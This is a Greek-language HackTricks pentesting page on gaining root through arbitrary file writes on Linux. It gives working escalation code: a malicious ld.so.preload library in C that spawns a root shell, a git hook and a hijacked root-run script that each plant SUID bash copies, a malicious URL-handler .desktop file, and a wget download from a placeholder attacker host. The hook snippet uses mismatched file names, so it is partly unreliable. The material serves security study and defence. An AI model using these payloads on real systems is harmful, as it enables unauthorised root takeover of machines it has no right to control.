# Αυθαίρετη εγγραφή αρχείου στο root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

Αυτό το αρχείο λειτουργεί όπως η μεταβλητή περιβάλλοντος **`LD_PRELOAD`**, αλλά λειτουργεί επίσης σε **SUID binaries**.\
Αν μπορείτε να το δημιουργήσετε ή να το τροποποιήσετε, μπορείτε απλώς να προσθέσετε μια **διαδρομή προς μια βιβλιοθήκη που θα φορτωθεί** με κάθε εκτελούμενο binary.

Για παράδειγμα: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) είναι **scripts** που **run** σε διάφορα **events** σε ένα git repository, όπως όταν δημιουργείται ένα commit, μια merge... Έτσι, αν ένα **privileged script or user** εκτελεί αυτές τις ενέργειες συχνά και υπάρχει δυνατότητα να **write in the `.git` folder**, αυτό μπορεί να χρησιμοποιηθεί για **privesc**.

Για παράδειγμα, είναι δυνατό να **generate a script** σε ένα git repo στο **`.git/hooks`** ώστε να εκτελείται πάντα όταν δημιουργείται ένα νέο commit:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Cron & αρχεία χρόνου

Εκκρεμεί

### Service & Socket αρχεία

Εκκρεμεί

### binfmt_misc

Το αρχείο που βρίσκεται στο `/proc/sys/fs/binfmt_misc` υποδεικνύει ποιο binary θα εκτελεί ποιον τύπο αρχείων. Εκκρεμεί: έλεγχος των απαιτήσεων για την κατάχρηση αυτού του μηχανισμού ώστε να εκτελεστεί rev shell όταν ένας κοινός τύπος αρχείου ανοίγει.

### Αντικατάσταση handlers σχημάτων (like http: or https:)

Ένας επιτιθέμενος με δικαιώματα εγγραφής στους φακέλους ρυθμίσεων ενός θύματος μπορεί εύκολα να αντικαταστήσει ή να δημιουργήσει αρχεία που αλλάζουν τη συμπεριφορά του συστήματος, οδηγώντας σε ανεπιθύμητη εκτέλεση κώδικα. Με την τροποποίηση του αρχείου `$HOME/.config/mimeapps.list` ώστε οι handlers URL για HTTP και HTTPS να δείχνουν σε ένα κακόβουλο αρχείο (π.χ., με `x-scheme-handler/http=evil.desktop`), ο επιτιθέμενος εξασφαλίζει ότι **κάθε κλικ σε σύνδεσμο http ή https εκκινεί τον κώδικα που καθορίζεται σε αυτό το αρχείο `evil.desktop`**. Για παράδειγμα, μετά την τοποθέτηση του ακόλουθου κακόβουλου κώδικα στο `evil.desktop` στο `$HOME/.local/share/applications`, κάθε κλικ σε εξωτερικό URL τρέχει την ενσωματωμένη εντολή:
```bash
[Desktop Entry]
Exec=sh -c 'zenity --info --title="$(uname -n)" --text="$(id)"'
Type=Application
Name=Evil Desktop Entry
```
Για περισσότερες πληροφορίες δείτε [**this post**](https://chatgpt.com/c/67fac01f-0214-8006-9db3-19c40e45ee49) όπου χρησιμοποιήθηκε για να εκμεταλλευτεί μια πραγματική ευπάθεια.

### Root executing user-writable scripts/binaries

Αν μια privileged workflow εκτελεί κάτι σαν `/bin/sh /home/username/.../script` (ή οποιοδήποτε binary μέσα σε έναν κατάλογο που ανήκει σε unprivileged χρήστη), μπορείτε να το hijack:

- **Εντοπίστε την εκτέλεση:** παρακολουθήστε διεργασίες με [pspy](https://github.com/DominicBreuker/pspy) για να πιάσετε root να καλεί user-controlled paths:
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Επιβεβαίωση εγγραφής:** βεβαιώσου ότι τόσο το αρχείο-στόχος όσο και ο κατάλογός του ανήκουν και είναι εγγράψιμα από τον χρήστη σου.
- **Κατάληψη του αρχείου-στόχου:** δημιούργησε αντίγραφο ασφαλείας του αρχικού binary/script και τοποθέτησε ένα payload που δημιουργεί ένα SUID shell (ή οποιαδήποτε άλλη ενέργεια root), στη συνέχεια επανέφερε τα δικαιώματα:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Ενεργοποιήστε την ενέργεια με προνόμια** (π.χ. πατώντας ένα UI button που εκκινεί τον helper). Όταν ο root επανεκτελέσει το hijacked path, πάρτε το escalated shell με `./rootshell -p`.

## Αναφορές

- [HTB Bamboo – hijacking a root-executed script in a user-writable PaperCut directory](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)

{{#include ../../banners/hacktricks-training.md}}
